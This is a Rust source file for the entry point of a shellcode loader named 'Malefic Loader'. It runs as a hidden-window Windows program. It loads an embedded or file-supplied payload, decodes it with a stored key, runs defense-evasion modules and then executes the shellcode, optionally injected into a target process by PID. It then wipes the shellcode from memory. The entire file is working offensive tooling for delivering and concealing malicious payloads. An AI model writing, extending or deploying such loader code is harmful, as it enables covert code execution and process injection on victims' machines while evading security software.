//! Malefic Loader - Main entry point
//! Three-stage pipeline: Load → Decode → Execute

#![windows_subsystem = "windows"]

use malefic_starship::Shellcode;
use malefic_starship::launch::{load_shellcode, decode_payload, has_encoding, execute_loader};
use std::env;

/// Parse target PID from command line arguments (second or third arg depending on context)
fn get_target_pid(args: &[String]) -> Option<u32> {
    // With embedded payload: starship.exe [pid]
    // Without embedded payload: starship.exe <payload> [pid]
    let pid_arg = if cfg!(feature = "embedded_payload") {
        args.get(1)
    } else {
        args.get(2)
    };
    pid_arg.and_then(|s| s.parse::<u32>().ok())
}

fn main() {
    let args: Vec<String> = env::args().collect();

    // Stage 1: Load payload
    let raw_data = if cfg!(feature = "embedded_payload") {
        // Embedded payload from generated/ directory
        let enc = include_bytes!("../generated/payload.enc");
        if enc.is_empty() {
            // Fallback to file argument if embedded payload is empty
            if args.len() > 1 {
                load_shellcode(&args[1]).unwrap_or_else(|e| { eprintln!("{}", e); std::process::exit(1); })
            } else {
                Shellcode::new(vec![0x90, 0x90, 0x90, 0xCC])
            }
        } else {
            Shellcode::new(enc.to_vec())
        }
    } else if args.len() > 1 {
        load_shellcode(&args[1]).unwrap_or_else(|e| { eprintln!("{}", e); std::process::exit(1); })
    } else {
        Shellcode::new(vec![0x90, 0x90, 0x90, 0xCC])
    };

    // Stage 2: Decode payload (if encoding feature enabled)
    let shellcode = if has_encoding() {
        let key = include_bytes!("../generated/payload.key");
        let extra = include_bytes!("../generated/payload.extra");
        let decoded = decode_payload(&raw_data.data, key, extra);
        Shellcode::new(decoded)
    } else {
        raw_data
    };

    // Stage 2.5: Run evasion modules (before payload execution)
    malefic_evader::run_evaders();

    // Stage 3: Execute
    let target_pid = get_target_pid(&args);
    let result = unsafe { execute_loader(&shellcode, target_pid) };

    // Stage 4: Secure cleanup — zeroize shellcode from memory
    #[cfg(feature = "obf_memory")]
    drop(shellcode);

    match result {
        Ok(()) => {}
        Err(e) => { eprintln!("[-] {}", e); std::process::exit(1); }
    }
}
